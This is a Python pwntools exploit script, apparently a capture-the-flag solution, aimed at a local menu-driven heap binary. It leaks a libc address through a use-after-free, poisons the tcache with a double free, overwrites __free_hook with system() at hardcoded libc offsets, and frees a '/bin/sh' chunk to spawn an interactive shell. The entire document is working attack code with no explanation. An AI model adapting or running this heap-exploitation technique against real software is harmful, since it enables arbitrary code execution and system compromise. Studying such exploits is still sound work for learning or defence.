#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./bin")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"size : ", str(size).encode())
    shell.sendlineafter(b"data : ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"index : ", str(index).encode())

def read(index):
    shell.sendlineafter(b"> ", b"3")
    shell.sendlineafter(b"index : ", str(index).encode())
    shell.recvuntil(b"Data : ")
    return shell.recvline().strip()

malloc(124, b"A" * 8)
malloc(24, b"B" * 8)

for i in range(8):
    free(0)

libc_base = u64(read(0).ljust(8, b"\x00")) - 0x3b0ca0

free(1)
free(1)

malloc(24, p64(libc_base + 0x3b28e8)) # __free_hook()
malloc(24, b"/bin/sh\x00")
malloc(24, p64(libc_base + 0x041b80)) # system()

free(1)

shell.recvline()
shell.interactive()
